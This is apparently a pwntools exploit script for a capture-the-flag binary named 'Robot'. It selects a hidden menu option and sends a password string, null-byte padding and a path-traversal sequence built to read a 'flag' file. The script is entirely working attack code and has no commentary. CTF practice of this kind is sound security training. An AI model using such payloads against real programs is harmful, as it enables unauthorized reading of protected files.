from pwn import *

p = process('./Robot')
p.recvuntil('exit...')
p.sendline('666')
p.recvuntil('password:')

payload = '327a6c4304ad5938eaf0efb6cc3e53dc' + '\0'*0x20 + './'*16 + 'flag'
p.sendline(payload)

p.recvuntil('Flag')
p.sendline('6')

p.interactive()